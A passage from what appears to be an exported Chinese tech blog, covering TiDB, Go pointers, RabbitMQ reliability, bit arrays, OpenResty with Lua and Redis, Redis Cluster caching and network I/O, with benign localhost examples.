难题。\n主从复制模型不能保证同时满足强一致性和高可用性。如果出现结点失效、网络中断、延迟抖动等情况，多主结点复制方案会更加可靠，但是代价则是系统的高复杂度和弱一致性保证。多主结点复制适用于多数据中心，每个数据中心采用常规的主从复制方案，各个数据中心的主结点负责与其它数据中心的主结点交换 replicated log。\n小结 面对透明分片（transparent sharding）、弹性伸缩（auto-scaling）、自动恢复（auto-failover）、异地多活（multi-data center）～等需求，传统的解决方案使我们陷入窘境。\nSQL 和 NoSQL ACID 和 BASE 为什么不使用 NoSQL 数据库代替 MySQL 数据库呢？假设我们有了大刀阔斧迁移数据和重写应用程序的决心（基本不可能），但是许多 NoSQL 数据库都牺牲了一致性，而倾向于可用性，这种一致性模型往往被称为 BASE：\n  基本可用性（Basically Available）。\n  软状态（Soft state）。类似中间状态。\n  最终一致性（Eventual consistency）。\n  BASE 模凌两可，太长或永远不一致的系统基本不可用。许多处理重要数据的系统（例如，财务、订单、互联网金融系统等）随着快速增长的数据和负载，常规的关系数据库扩展困难，而对于 ACID ，特别是一致性的要求，NoSQL 数据库难以满足。相较于 BASE 的承诺，关系数据库的 ACID 的承诺是五十步笑百步（一致性往往推卸给应用程序）：\n  原子性（Atomicity）。事务中的操作序列，要么全部执行完成（提交），要么全部不执行（回滚）。\n  一致性（Consistency）。不蕴含矛盾，逻辑自洽\u0026hellip;\u0026hellip;\n  隔离性（Isolation）。同时运行的事务不应相互干扰，事务提交时，其结果与串行执行完全相同。\n  持久性（Durability）。无完美或绝对的保证。\n  数据模型与查询语言 NoSQL 数据库缺乏 JOIN 的能力，这是其文档模型的限制。关系数据库市场占有率一直居高不下，参考 DB-Engines Ranking，原因之一是 SQL（DDL、DML、DQL、DCL） 是声明式语言的代表，它的简单与统一在于指定结果所满足的模式，在不改变语句的前提下，查询优化器或底层引擎的迭代更新就有可能显著提高性能。\nSQL 的关系模型理论足够优雅：\n  关系是笛卡尔积的一个子集。\n  关系（表）是元组（行）的集合。\n  关系（表）经过运算以后，如 SELECT、JOIN、WHERE、交、并、差（关系代数），结果还是一个关系（表）。\n  近年来，流行开源组件提供类 SQL 的趋势越来越明显，例如 Spark SQL、KSQL、Flink SQL、ClickHouse SQL\u0026hellip;\nNewSQL 新在哪 NewSQL 是一类关系数据库系统，旨在为 OLTP 提供 NoSQL 数据库系统的可扩展性，同时提供传统关系数据库系统的 ACID 保证。OLTP 与 OLAP 有时区分并不是那么明显，前者侧重 T（事务），后者侧重 A（分析）：\nNewSQL 数据库系统新在架构、存储引擎、共识算法。\n你好 TiDB TiDB 项目受到了 Spanner/F1 与 Raft 的启发，TiKV 对应的是 Spanner，TiDB 对应的是 F1，详情请看 TiDB 整体架构、TiDB 数据库的存储、TiDB 数据库的计算、调度概述\u0026hellip;\u0026hellip;\nSQL Layer 无状态，可以通过负载均衡组件（如 LVS、HAProxy、F5）对外提供统一的接入地址。\n1  tiup playground v4.0.0 --db 3 --kv 4 --pd 3 --monitor   如上所示，使用 tiup 启动了 3 个 TiDB 实例和 4 个 TiKV 实例以及 3 个 PD 实例。\n1 2 3 4 5 6 7 8 9 10  Waiting for tikv 127.0.0.1:20160 ready Waiting for tikv 127.0.0.1:20161 ready Waiting for tikv 127.0.0.1:20162 ready Waiting for tikv 127.0.0.1:20163 ready CLUSTER START SUCCESSFULLY, Enjoy it ^-^ To connect TiDB: mysql --host 127.0.0.1 --port 4000 -u root To connect TiDB: mysql --host 127.0.0.1 --port 4001 -u root To connect TiDB: mysql --host 127.0.0.1 --port 4002 -u root To view the dashboard: http://127.0.0.1:2379/dashboard To view the monitor: http://127.0.0.1:9090   TiDB 非常友好地兼容了 MySQL 5.7 协议，从 MySQL 迁移到 TiDB 对应用程序无限接近零侵入。这里我们可以通过 MySQL 命令行工具连接某一个 TiDB 实例。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  % mysql --host 127.0.0.1 --port 4000 -u root Welcome to the MySQL monitor. Commands end with ; or \\g. Your MySQL connection id is 5 Server version: 5.7.25-TiDB-v4.0.0 TiDB Server (Apache License 2.0) Community Edition, MySQL 5.7 compatible Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved. Oracle is a registered trademark of Oracle Corporation and/or its affiliates. Other names may be trademarks of their respective owners. Type \u0026#39;help;\u0026#39; or \u0026#39;\\h\u0026#39; for help. Type \u0026#39;\\c\u0026#39; to clear the current input statement. mysql\u0026gt; show databases; +--------------------+ | Database | +--------------------+ | INFORMATION_SCHEMA | | METRICS_SCHEMA | | PERFORMANCE_SCHEMA | | mysql | | test | +--------------------+ 5 rows in set (0.00 sec)   导入样本数据集到某一个 TiDB 实例，样本数据集的 database 名称为 employees。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  % mysql --host 127.0.0.1 --port 4001 -u root \u0026lt; employees.sql INFO CREATING DATABASE STRUCTURE INFO storage engine: InnoDB INFO LOADING departments INFO LOADING employees INFO LOADING dept_emp INFO LOADING dept_manager INFO LOADING titles INFO LOADING salaries data_load_time_diff NULL   我们会发现，连接任意一个 TiDB 实例都能观察到 employees 库。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  mysql\u0026gt; show tables from employees; +----------------------+ | Tables_in_employees | +----------------------+ | current_dept_emp | | departments | | dept_emp | | dept_emp_latest_date | | dept_manager | | employees | | salaries | | titles | +----------------------+ 8 rows in set (0.00 sec)   TiKV 数据分区的术语是 Region，使用 Raft 对写入数据在多个 TiKV 结点（实例）之间自动分片和复制日志，每个 Region 的所有副本（默认为三副本）组成一个 Raft Group，每个 TiKV 实例（结点）负责多个 Region。\n同城多数据中心部署和两地三中心部署则提供了更强大的容错（容灾）能力。\n 本文首发于 https://h2cone.github.io\n 参考资料   Designing Data-Intensive Applications\n  Understanding Database Sharding\n  “分库分表\u0026quot; ？选型和流程要慎重，否则会失控\n  MySQL 5.7 Reference Manual # Replication Implementation\n  SQL vs NoSQL: What\u0026rsquo;s the difference?\n  Wiki # NewSQL\n  Shared-nothing architecture\n  演讲实录|黄东旭：分布式数据库模式与反模式\n  How do we build TiDB\n  PingCAP blog\n  TiDB 数据库快速上手指南\n  PingCAP docs\n  ","date":"2020-07-11T11:21:03+08:00","permalink":"https://h2cone.github.io/2020/07/11/from-mysql-to-tidb/","title":"从 MySQL 到 TiDB"},{"content":"关键  变量是包含值的存储。 指针的值是变量的地址。  Go 语言的变量都拥有地址，而指针是一个变量，它的值是另外一个变量的地址。当我们说整型指针时，我们指的是一类型的指针。考虑下面的代码片段：\n1 2 3 4 5  x := 1 p := \u0026amp;x // p, 类型 *int, 指向 x fmt.Println(*p) // \u0026#34;1\u0026#34; *p = 2 // 相当于 x = 2 fmt.Println(x) // \u0026#34;2\u0026#34;   操作符 \u0026amp; 作用于变量 x，产生了指针 p，p 的类型是 *int，可以发现其中 int 就是 x 的类型；操作符 * 作用于 p，检索了 p 指向的变量 x，能够读写 x 的值，但是这到底是什么意思？下图是一个很好的类比：\n左边为变量，中间为地址 （试着打印一下 p），右边为值。当执行了 p := \u0026amp;x 后，*p 是 x 的别名，故赋新值给 *p 也就修改了 x 的值。为什么指针还需要绑定类型？出于类型安全考虑，如果把上面代码的 *p = 2 替换成 *p = \u0026quot;two\u0026quot;，那么编译不通过。\n畅想  Go 函数调用的参数传递是值传递，值可能是地址，拷贝地址往往更高效，且能操纵指向的变量的值或引用的数据结构。 Java 把指针 （Pointer）伪装成引用（Reference），创建一个对象，则产生了这个对象的引用。 Java 方法调用的参数传递估计是值传递，只不过原始类型 （primitive type）赋予的是原值而引用类型 （reference type）赋予的是地址。   本文首发于 https://h2cone.github.io\n ","date":"2020-06-21T11:11:59+08:00","permalink":"https://h2cone.github.io/2020/06/21/go-pointer/","title":"Go 指针要点"},{"content":"图片来自网络  本文首发于 https://h2cone.github.io\n ","date":"2020-06-04T00:00:24+08:00","permalink":"https://h2cone.github.io/2020/06/04/goodbye-spring/","title":"Goodbye Spring"},{"content":"高级消息队列协议 众所周知，RabbitMQ 实现了 AMQP（Advanced Message Queuing Protocol），准确来说是 AMQP 0-9-1；AMQP 是一种使符合要求的客户端可以与符合要求的消息代理（message broker）进行通信的一种消息传递协议，它的概念如下图所示：\n生产者（producer）发布消息，消费者（consumer）消耗消息。生产者或发布者（publisher）通常无需关心以下几点：\n  消息将发送到哪些队列（queue）。\n  消息（message）被哪些消费者消费。\n  Exchange 接收生产者发布的消息并路由到队列，exchange 根据什么转发消息到队列？人类可以使用绑定（binding）来定义 queue 和 exchange 的关系以及提供消息路由规则。生产者只面向 exchange 发布消息，而消费者只面向 queue 消耗消息，因此常说 RabbitMQ 解耦生产者和消费者。\n值得一提的是，单独的 MySQL server 可以创建多个数据库；与此类似，单独的 RabbitMQ server 可以创建多个虚拟主机（virtual host）。虚拟主机包含 queues 和 exchanges 以及 bindings，虚拟主机之间可相互隔离。\nExchange 当成功安装了 RabbitMQ 并正常启动后，可以通过后台管理界面去直观认识这种消息代理，不难发现 RabbitMQ 提供了 4 种 exchange 类型：\nExchange 使用的路由算法取决于 exchange 类型和 binding 规则。\nDirect exchange 如果一个 exchange 的类型是 direct，将一个 queue 绑定到该 exchange 时，要求附加一个名为 routing key 的参数；当一个携带 routing key 的消息到达该 exchange 时，该 exchange 将转发消息到相应的 queue（精确匹配 routing key）。\nFonout exchange 类型为 fonout 的一个 exchange 忽略 routing key，将消息广播到所有与该 exhange 绑定的 queue。\nTopic exchange 它与 direct exchange 类似，绑定时要求设置 routing key，不同在于路由时 topic exchange 支持模糊匹配或正则表达式匹配 routing key。\nHeaders exchange 它忽略 routing key，路由是根据消息中的 header 和绑定时设置的 argument。\n可靠的消息传递  即使 TCP 确认一个数据包已经发送到目标结点，但应用程序也可能在处理完成之前发生崩愤。如果你想知道一个请求是否执行成功，就需要应用级别的回复。\n 所谓可靠的消息传递，参考底层 TCP 可靠传输的基本思想，应用层的 RabbitMQ 是否也有确认、超时、重传等概念？\n确认与回执 Publisher confirms 允许消息代理向发布者表明消息已收到或已处理，Consumer acknowledgements 允许消费者向消息代理表明消息已收到或已处理。Acknowledgement 即是回执，简称 ack，消息代理的 ack 就是 publisher confirms，消费者的 ack 就是 consumer acknowledgements。使用发布者确认或消费者回执至少可以保证一次消息传递不丢失消息，建议关闭自动 ack 或开启手动模式。\nPublisher confirms 1 2 3 4 5 6 7 8  Channel channel = connection.createChannel(); channel.confirmSelect(); channel.addConfirmListener((deliveryTag, multiple) -\u0026gt; { // code when message is confirmed }, (deliveryTag, multiple) -\u0026gt; { // code when message is nack-ed });   对于 Java 客户端而言，可以异步处理 publisher confirms，一是消息代理已收到消息或已处理消息的客户端回调方法；二是消息代理未收到消息或已丢失消息的客户端回调方法，丢失的消息仍可能传递到消费者，但是消息代理没法保证这一点。long deliveryTag 是在一个 Channel 中一次消息传递的标示符，它是单调递增的正整数；boolean multiple 为 true 则表示当前和 deliveryTag 之前的消息已收到或已处理。对于无法路由的消息，消息代理虽然也会回复（返回空队列列表），但是默认情况下无法路由的消息会被丢弃，除非发布消息时将 boolean mandatory 设为 true 或使用 alternate exchange 来备份。\n1 2 3 4  channel.addReturnListener(returnMessage -\u0026gt; { // to be notified of failed deliveries  // when basicPublish is called with \u0026#34;mandatory\u0026#34; or \u0026#34;immediate\u0026#34; flags set });   Consumer acknowledgements 1 2 3 4 5 6 7 8  // this example assumes an existing channel instance  // 确认，ack \u0026gt; 0 channel.basicAck(deliveryTag, multiple); // 否认，ack \u0026lt; 0 channel.basicNack(deliveryTag, multiple, requeue); // 拒绝，ack \u0026lt; 0 channel.basicReject(deliveryTag, requeue)   消费者的回执可以是确认、否认、拒绝。不管是否认还是拒绝，如果 boolean requeue 为 false 则相应的消息将被消息代理丢弃，设为 true 则相应的消息将重新加入消息代理的队列，从而允许其它消费者消费；boolean multiple 为 true 表示否认或拒绝当前和 deliveryTag 之前的消息。确认则表示相应的消息已收到或已处理，消息代理将记录已推送的消息，也可以将其丢弃。如果消费者投递给消息代理的 ack 丢失了会发生什么？消息代理将重发。\nAMQP 事务 RabbitMQ 事务将可能大幅降低吞吐量，故一般不推荐使用。\n Using standard AMQP 0-9-1, the only way to guarantee that a message isn\u0026rsquo;t lost is by using transactions \u0026ndash; make the channel transactional then for each message or set of messages publish, commit. In this case, transactions are unnecessarily heavyweight and decrease throughput by a factor of 250. To remedy this, a confirmation mechanism was introduced. It mimics the consumer acknowledgements mechanism already present in the protocol.\n 集群 旧文提到过软件系统三大目标，首先，RabbitMQ 集群如何保证可靠性？RabbitMQ 集群是一个或多个结点的逻辑分组，每个结点共享 exchanges、bindings、queues、virtual hosts、users（RabbitMQ 有 RBAC 特性）、runtime parameters 等运行时状态，且结点对等（P2P）。对于客户端来说，集群中的每个结点都可以绑定、发布、删除连接到首个结点时创建的 exchange。\nRabbitMQ 集群提供了创建高可用队列（HA queues）的方法来支持容错（fault tolerance）。高可用队列横跨多个集群结点并共享同步的队列状态，包括消息数据。任何具有高可用队列的结点发生故障，群集中的其它结点仍将包含消息和队列状态；当故障结点恢复并重新加入集群时，它将同步它下线时错过的消息。\n 本文首发于 https://h2cone.github.io\n 参考资料   AMQP 0-9-1 Model Explained\n  Messageing using AMQP\n  RabbitMQ # Consumer Acknowledgements and Publisher Confirms\n  RabbitMQ # Tutorials # Publisher Confirms\n  rabbitmq 重复确认导致消息丢失\n  RabbitMQ # Reliability Guide\n  RabbitMQ # Clustering Guide\n  RabbitMQ # Cluster Formation and Peer Discovery\n  harbur/docker-rabbitmq-cluster\n  RabbitMQ in Depth # Chapter 7. Scaling RabbitMQ with clusters\n  ","date":"2020-05-04T11:54:46+08:00","permalink":"https://h2cone.github.io/2020/05/04/rabbitmq-reliability/","title":"RabbitMQ 的可靠性"},{"content":"纸上谈兵  有两个 1GB 的文本文件，文件内容是无序数组（一行一个整数，一个文件中大概有一亿个非负整数，同一个文件中不重复），请在内存使用尽可能少的情况下将只在其中一个文件出现过的数字找出来。\n 应用 BitArray。逐行读取 2 个文件的整数并分别映射到 2 个 BitArray，其中每个 BitArray 的长度为 1 亿，即 100000000 bit = 11.92093 MB，求这两个 BitArray 的对称差。\n映射。将文件中的非负整数映射为下标（索引），比如给定 {1, 5} 和 {1, 2} 这两个整数集，则相应的 BitArray 分别形如：\n00\u0026hellip;100010\n00\u0026hellip;000110\nBit array 每位初始值位 0，设置为 1 则表示该位的下标（index）为相应的整数，右边第一位下标为 0，从右到左单调递增，增量为 1。\n对称差。两个集合的对称差是属于一个集合而不属于另一个集合的元素组成的集合。比如 {1, 5} 与 {1, 2} 的对称差为 {2, 5}，相应的 BitArray 运算形如：\n00\u0026hellip;100010 ^ 00\u0026hellip;000110 -\u0026gt; 00\u0026hellip;100100\n 本文首发于 https://h2cone.github.io\n ","date":"2020-04-23T17:40:57+08:00","permalink":"https://h2cone.github.io/2020/04/23/bit-array-0/","title":"初识 BitArray"},{"content":"Nginx Nginx 是高性能的负载均衡器、Web 服务器、反向代理服务器。它是我们既熟悉又陌生的老朋友，经常依靠它水平扩展应用程序、部署前端应用程序、代理应用程序、构建 API 网关等，Nginx 由纯 C 语言实现，但却非常易于使用。\n早在 2005 年，官方博客用一篇标题为 Inside NGINX: How We Designed for Performance \u0026amp; Scale 的文章描述了 Nginx 的架构：\n  Nginx 如何创建进程以有效利用资源。\n  使用状态机来管理流量（traffic）。\n  非阻塞和事件驱动的架构使 Nginx 可以同时调度多个状态机。\n  进程架构如何支持不间断的优雅更新和二进制升级。\n  OpenResty 不妨先看看 OpenResty 官方的宣传语。\n OpenResty® 是一个基于 Nginx 与 Lua 的高性能 Web 平台，其内部集成了大量精良的 Lua 库、第三方模块以及大多数的依赖项。用于方便地搭建能够处理超高并发、扩展性极高的动态 Web 应用、Web 服务和动态网关。\n 比起使用 C 语言，使用 Lua 门槛要稍低一些，而且有 LuaJIT 的性能优化。\n OpenResty® 通过汇聚各种设计精良的 Nginx 模块（主要由 OpenResty 团队自主开发），从而将 Nginx 有效地变成一个强大的通用 Web 应用平台。这样，Web 开发人员和系统工程师可以使用 Lua 脚本语言调动 Nginx 支持的各种 C 以及 Lua 模块，快速构造出足以胜任 10K 乃至 1000K 以上单机并发连接的高性能 Web 应用系统。\n 对于基于 I/O 多路复用（请见网络·NIO # I/O 模型）的 Nginx 来说，单机 C1000K 不在话下，反而是受限于操作系统或配置。\n OpenResty® 的目标是让你的 Web 服务直接跑在 Nginx 服务内部，充分利用 Nginx 的非阻塞 I/O 模型，不仅仅对 HTTP 客户端请求，甚至于对远程后端诸如 MySQL、PostgreSQL、Memcached 以及 Redis 等都进行一致的高性能响应。\n 既然支持访问多种数据库，则足矣处理复杂的业务逻辑。\n接下来，以一个名为 openresty-exp/redis-example 的例子来初步体验 OpenResty。\n1 2 3 4 5 6  . ├── RedisExample.lua ├── conf │ └── nginx.conf ├── logs │ └── error.log   首先新建配置文件目录（conf）和日志文件目录（logs），然后编写 Nginx 配置文件（nginx.conf）。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  worker_processes 1; error_log logs/error.log; events { worker_connections 1024; } http { server { listen 80; location ~ /redis/(.+)/(.+) { charset utf-8; lua_code_cache on; content_by_lua_file RedisExample.lua; } } }   Nginx http server 监听 80 端口，为了方便展示，匹配的请求 URL 包含两个路径参数。Nginx 处理 HTTP 请求分成了若干阶段，详情请见 Nginx # http phases，或则直接参考 OpenResty # 执行阶段概念，这里只关心正常生成响应的阶段（content）并使用 Lua 脚本处理业务逻辑。\n假设 HTTP 客户端发送包含键值对的请求到 Nginx server，Nginx server 先将键值对插入 Redis 实例，然后再从 Redis 实例查询相应的键所对应的值，最后发送包含键值对的响应到 HTTP 客户端。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39  local json = require \u0026#34;cjson\u0026#34; local redis = require \u0026#34;resty.redis\u0026#34; local red = redis.new() red:set_timeouts(1000, 1000, 1000) local ok, err = red:connect(\u0026#34;127.0.0.1\u0026#34;, 6379) if not ok then ngx.say(\u0026#34;failed to connect: \u0026#34;, err) return end local key = ngx.var[1] local val = ngx.var[2] local ok, err = red:set(key, val) if not ok then ngx.say(\u0026#34;failed to set: \u0026#34;, err) return end local val, err = red:get(key) if not val then ngx.say(\u0026#34;failed to get: \u0026#34;, err) return end if val == ngx.null then ngx.say(\u0026#34;key no found\u0026#34;) return end local ok, err = red:close() if not ok then ngx.say(\u0026#34;failed to close: \u0026#34;, err) return end ngx.say(json.encode({[key]=val}))   启动 Nginx 并指定配置文件。\n1  openresty -p `pwd`/ -c conf/nginx.conf   使用 HTTP 客户发送请求。\n1 2  % curl 127.0.0.1/redis/hello/world {\u0026#34;hello\u0026#34;:\u0026#34;world\u0026#34;}   Nginx server 响应正常。\n 本文首发于 https://h2cone.github.io\n Memo   Inside NGINX\n  The Architecture of Open Source Applications (Volume 2): nginx\n  Nginx # development guide\n  HTTP request processing phases in Nginx\n  Nginx # modules # lua\n  OpenResty # Components\n  lua-nginx-module\n  lua-resty-redis\n  OpenResty 最佳实践\n  OpenResty 不完全指南\n  Lua Style Guide\n  ","date":"2020-03-31T14:44:18+08:00","permalink":"https://h2cone.github.io/2020/03/31/openresty-exp/","title":"使用 Lua 拓展 Nginx"},{"content":"铺垫 存储层次结构   自下而上，更小更快。\n  自顶向下，更大更慢。\n  上层是下层的（高速）缓存。\n  软件系统三大目标    目标 解释 期望 战术     可靠性 容错能力 硬件故障、软件错误、人为失误发生时继续正常运作 熔断、降级、自动恢复、容灾、高可用、强一致性\u0026hellip;\u0026hellip;   可扩展性 应对负载增加的能力 负载增加时保持良好性能或高性能 低延迟、高吞吐、弹性伸缩\u0026hellip;\u0026hellip;   可维护性 运维和开发的难易程度 既简单又好拓展 DRY、SoC、DevOps\u0026hellip;\u0026hellip;    Redis cluster 单一独立的 Redis 结点，虽然它真的很快（未来将开新篇章解释），但是也有上限，性能提升总将遇到天花板，而且单点故障将导致一段时间服务不可用。\nRedis 集群如何解决可靠性问题和扩展性问题？\n  数据在多个 Redis 结点之间自动分片（shard）。\n  Redis 集群可以在分区期间提供一定程度的可用性（availability）。\n  水平扩展 Redis（scalability）。\n  数据分片 Redis 集群不使用一致性哈希，而是使用哈希槽（hash slot）。\n如上图所示，Redis 集群中的结点（node）负责各自的哈希槽。向集群插入一个键（key）时，只是计算给定键的 CRC16 并取 16384 的模来将给定键映射到哈希槽。\n使用哈希槽可以“轻松”在集群中添加结点到删除结点。若增加一个结点 D，则从 A、B、C 移动一些哈希槽到 D，同理，若删除一个结点 A，则从 A 移动哈希槽到结点 B、C、D，当 A 为空可被完全从集群移除；而且，添加结点、删除结点、更改结点的哈希槽的百分比都不要求集群暂停运作，不需要任何停机时间。\n值得注意的是，Redis 集群支持多个键的操作，前提是单个命令执行或整个事务或 Lua 脚本执行中涉及的所有键属于同一个哈希槽。我们可以使用称为 hash tags 的概念来强制多个 key 映射到同一个哈希槽。\n可用性与一致性 Redis 集群使用主从模型（master-slave model） 实现故障转移。\n如上图所示，在集群创建时或稍后，我们给每个主结点添加从结点，例如 B 是主结点，B1 是它的从结点，B1 的哈希槽是 B 的哈希槽的副本。当 B 发生故障，集群将提升 B1 为新主结点，继续提供服务；以此类推，当有若干主结点发生故障时，它们的从结点将替代它们成为新主结点，以此提供一定程度的可用性。\n为什说是一定程度的可用性，考虑以下的场景，集群极可能不能正常运作。\n  一对主从结点同时故障。\n  超过半数的结点发生了故障。\n  Redis 集群无法保证强一致性（strong consistency）。Kafka 的作者 Jay Kreps 曾经说过：\n Is it better to be alive and wrong or right and dead?\n 在可用性与一致性天平之间，Redis 集群侧重于可用性。当一个客户端连接集群并写入键，丢失写（lose writes）可能发生，因为 Redis 使用异步复制（asynchronous replication）。\n  客户端将给定键写入主结点 B\n  主结点 B 发送 OK 给客户端\n  从 B 复制数据到从结点 B1、B2、B3\u0026hellip;\u0026hellip;\n  注意，上面操作 2 和操作 3 非阻塞，即客户端写的同时，主结点 B 执行数据复制任务（通常只需复制命令），而不是阻塞直到所有数据复制完成再回复客户端，数据复制必定存在滞后；当 B 发生故障停止复制且 B 的从结点提升为新主结点，新主结点将可能不存在客户端已写入的键。\n这也是一种在性能与一致性之间的权衡（trade-off）。\n即使 Redis 支持同步复制，也有其它更复杂的情景导致主结点与从结点数据不一致。一种情景是从结点提升为主结点时，客户端将可能找不到目标键或读取了脏数据；当客户端发送一次足够大的键或足够多的键到一个主结点，以至于该主结点的从结点有充分时间提升为新主结点，旧主结点将拒绝接受键，且新主结点不存在客户端写入的键。\n未来将开新篇章谈谈分布系统的一致性和可用性。\n最小的集群 从 antirez/redis 克隆。\n1  git clone -v https://github.com/antirez/redis.git   编译一下。\n1 2  cd redis make   编译成功后，可以使用名为 redis-server 的可执行文件启动单 Redis 实例。\n1 2  cd src ./redis-server   检查 utils/create-cluster 目录，可以发现一个名为 create-cluster 的 Shell 脚本，该脚本基于 Redis 集群创建和管理命令行工具：\n1  redis-cli --cluster   创建 Redis 集群需要先启动若干 Redis 实例。\n1 2  create-cluster start create-cluster create   截取以上脚本输出的一部分：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  M: 02f543ee55bb36c72816617d24aaf3c1438abdd1 127.0.0.1:30001 slots:[0-5460] (5461 slots) master 1 additional replica(s) S: c7dcf3932a10ea80cd67e1f350c328b272da1cf4 127.0.0.1:30006 slots: (0 slots) slave replicates 6b27d42f51f5991f2458be0bf48bc28691e71dd4 M: 6b27d42f51f5991f2458be0bf48bc28691e71dd4 127.0.0.1:30003 slots:[10923-16383] (5461 slots) master 1 additional replica(s) M: cf89f789b2347d73e91f035d0c6b3b5eef0d8414 127.0.0.1:30002 slots:[5461-10922] (5462 slots) master 1 additional replica(s) S: 0b6d6ade090167e47bb74d385548c6b787d52f71 127.0.0.1:30005 slots: (0 slots) slave replicates cf89f789b2347d73e91f035d0c6b3b5eef0d8414 S: 0166962044b5fa13cf64d0c968963e5ee63f3241 127.0.0.1:30004 slots: (0 slots) slave replicates 02f543ee55bb36c72816617d24aaf3c1438abdd1   默认情况下，总共 6 个结点，3 个 主结点（M），3 个 从结点（S），更多用法请参考 utils/create-cluster/README。\n我们使用 redis-cli 试验一下自动数据分片。\n1 2 3 4  % redis-cli -c -p 30001 127.0.0.1:30001\u0026gt; set foo bar -\u0026gt; Redirected to slot [12182] located at 127.0.0.1:30003 OK   1 2 3 4  % redis-cli -c -p 30003 127.0.0.1:30003\u0026gt; set hello world -\u0026gt; Redirected to slot [866] located at 127.0.0.1:30001 OK   当查找键时，可能返回错误信息，提示我们转而连接其它结点。\n1 2 3  % redis-cli -p 30002 127.0.0.1:30002\u0026gt; get foo (error) MOVED 12182 127.0.0.1:30003   1 2 3  redis-cli -p 30003 127.0.0.1:30003\u0026gt; get foo \u0026#34;bar\u0026#34;   当然，redis-cli 支持重定向。\n1 2 3 4 5 6 7  % redis-cli -c -p 30002 127.0.0.1:30002\u0026gt; get foo -\u0026gt; Redirected to slot [12182] located at 127.0.0.1:30003 \u0026#34;bar\u0026#34; 127.0.0.1:30003\u0026gt; get hello -\u0026gt; Redirected to slot [866] located at 127.0.0.1:30001 \u0026#34;world\u0026#34;   访问 Redis 集群的应用程序无法直接使用命令行工具，应用程序的 Redis 客户端需要以 Redis 集群的协议与 Redis 实例通信。在 Java 生态中，Jedis 已支持 Redis 集群。\n1 2 3 4 5 6  Set\u0026lt;HostAndPort\u0026gt; jedisClusterNodes = new HashSet\u0026lt;HostAndPort\u0026gt;(); //Jedis Cluster will attempt to discover cluster nodes automatically jedisClusterNodes.add(new HostAndPort(\u0026#34;127.0.0.1\u0026#34;, 7379)); JedisCluster jc = new JedisCluster(jedisClusterNodes); jc.set(\u0026#34;foo\u0026#34;, \u0026#34;bar\u0026#34;); String value = jc.get(\u0026#34;foo\u0026#34;);   客户端路由 一个严肃的客户端除了实现重定向或路由，还应该缓存哈希槽与结点地址之间的映射（进程内缓存或本地缓存），直接连接正确的结点（减小重定向频率）。发生故障转移之后或系统管理员增加或删除结点之后，客户端需要刷新映射。\n代理分发 客户端与一群 Redis 实例交流能否简化成与单一 Redis 实例交流？答案是增加一个中间层。\n代理（Proxy），比如 Redis Cluster Proxy 和 CodisLabs/codis，但是，代理通常也要提供一定程度的可用性。\n容器化 为了使 Docker 与 Redis 集群兼容，需要使用 Docker 的 host networking mode，详情请见 docker # network。\n组合拳 在高负载下的分布式系统中，我们通常考虑使用 Redis 作为 MySQL 等关系型数据库的（高速）缓存，虽然应用程序都要与它们通信，但是 Redis 访问内存要比数据库访问磁盘快得多，转而解决开头所说的三大问题；但仍然不是最优方案，再如开头所说，我们可以利用更上层的（高速）缓存，应用程序与 Redis 集群的网络开销可以通过进程内缓存或本地缓存进一步降低。\n例如，J2Cache，它将 Java 进程缓存框架作为一级缓存（比如 Ehcache），将 Redis 作为二级缓存。查找键时，先查找一级缓存，若一级缓存未命中则查找二级缓存。那么它如何解决一致性问题和可靠性问题？\n它可以使用 Redis 的发布/订阅（类似消息中间件的特性）来保证多个应用程序实例之间一定程度的缓存一致性，一定程度是因为 Redis 官方说将来有计划支持更可靠的消息传递；所谓可靠的消息传递，类比 TCP 可靠传输的基本思想，即确认、超时、重传等概念。\nCDN Content delivery network，即内容分发网络，不容忽视的大规模分布式多级缓存系统。\n如上面这张来自维基百科的插图所示，左手边是单服务器分发，右手边是 CDN 分发。CDN 结点通常部署在多个位置，CDN 系统能够在算法上将浏览器的请求导向离用户最近或最佳的 CDN 结点，浏览器则配合系统就近访问结点。使用 CDN 至少具有如下优势：\n 降低带宽成本。 缩短响应时间。 提高内容的的全球性。  CDN 系统是（回）源主机及其 Web 服务器的（高速）缓存，CDN 系统适合缓存的内容是文件。\n 本文首发于 https://h2cone.github.io\n 参考资料   Redis cluster tutorial\n  Redis Cluster Specification\n  生产环境下的 redis 集群一般是如何部署的？\n  A Few Notes on Kafka and Jepsen\n  Guava\u0026rsquo;s cache\n  Spring cache\n  J2Cache 和普通缓存框架有何不同，它解决了什么问题？\n  扒掉红薯的内裤-深入剖析J2Cache\n  Redis # documentation\n  redisson/redisson\n  CDN是什么？使用CDN有什么优势？\n  ","date":"2020-03-24T17:40:48+08:00","permalink":"https://h2cone.github.io/2020/03/24/distributed-cache/","title":"分布式缓存"},{"content":"I/O 本文以多线程·并发编程中的第一张图作为开篇：\n  I/O 设备包括鼠标、键盘、显示器、磁盘、网卡等。\n  I/O（输入/输出），输入是从 I/O 设备复制数据到主存，输出是从主存复制数据到 I/O 设备。\n  从一个计算机角度来看，网络（适配器）是它的一个 I/O 设备。当计算机系统从主存复制字节序列到网络适配器时，数据流经过网络到达另一台机器，同理，计算机系统可以从网络适配器复制字节序列到主存。\nSocket 从人类的角度来看，计算机网络由一台或多台机器组成。网络中，数据从一台机器传输到另一个机器的方式通常是分组交换，即数据被切分成适合传输的小块数据，小块数据都有各自的编号；它们从一个端点分道扬镳，但殊途同归，到另一个端点时，重新排列组合成完整数据。分组交换的好处之一是充分利用网络带宽，而当 TCP 连接空闲时，通常不占用任何带宽。\n分组交换有可能出现数据的丢失、乱序、重复，如何检测、重传、缓存，实现可靠性传输是 TCP 的目标。别问，问就是三次握手、四次挥手、滑动窗口协议、拥塞控制算法\u0026hellip;\u0026hellip;\nTCP/IP 协议族对普通程序员来说足够复杂，但是，David Wheeler 曾经说过：\n All problems in computer science can be solved by another level of indirection.\n   Socket 是进程与传输层的中间层。\n  Socket 包含五元组 (client ip, client port, server ip, server port, protocol)。\n  同在传输层的 UDP 不如 TCP 可靠，但是轻量级，因为它没有确认、超时、重传的概念，也没有拥塞控制，而且无连接，从而能广播。\nSocket 